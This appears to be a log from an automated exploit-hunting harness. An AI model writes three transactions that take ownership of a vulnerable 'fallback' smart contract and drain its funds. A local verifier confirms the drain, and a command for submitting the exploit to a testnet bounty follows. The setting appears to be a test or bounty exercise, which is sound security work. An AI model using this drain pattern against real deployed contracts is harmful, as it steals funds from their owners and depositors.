# Hunter agent run — fallback — deepseek-ai/DeepSeek-V4.1-Flash-1017 (provider: nearai; NEAR AI Cloud only if nearai) — 2026-11-07

## Turn 1 — model reply (verbatim)

The bug is that `receive()` lets any address with a nonzero contribution become owner by sending ether directly, and `withdraw()` then lets that owner drain the contract. I first contribute 1 wei to satisfy the contribution check, then send 1 wei with empty calldata to trigger `receive()` and become owner, then call `withdraw()` to drain the balance to zero.

```json
[
  {
    "to": "0xd3264fed42a0dc00663d0aa2b0abb90a19b347f2",
    "data": "0xd7bb99ba",
    "value": "1"
  },
  {
    "to": "0xd3264fed42a0dc00663d0aa2b0abb90a19b347f2",
    "data": "0x",
    "value": "1"
  },
  {
    "to": "0xd3264fed42a0dc00663d0aa2b0abb90a19b347f2",
    "data": "0x3ccfd60b",
    "value": "0"
  }
]
```

### Turn 1 — local verifier (committed verifier.wasm, wasmtime)

```
tx 1: success
tx 2: success
tx 3: success
validateInstance → 1
broken: True
```

**Result: invariant broken on turn 1.**

Next step on testnet (needs a funded hunter account and an open bounty on this invariant):
`python3 scripts/hunter.py --bounty <bounty> --hunter <account> --exploit hunter-agent/fallback-deepseek-ai_DeepSeek-V4.1-Flash-1017-exploit.json --label agent-fallback --invariant fallback-owner-drained`
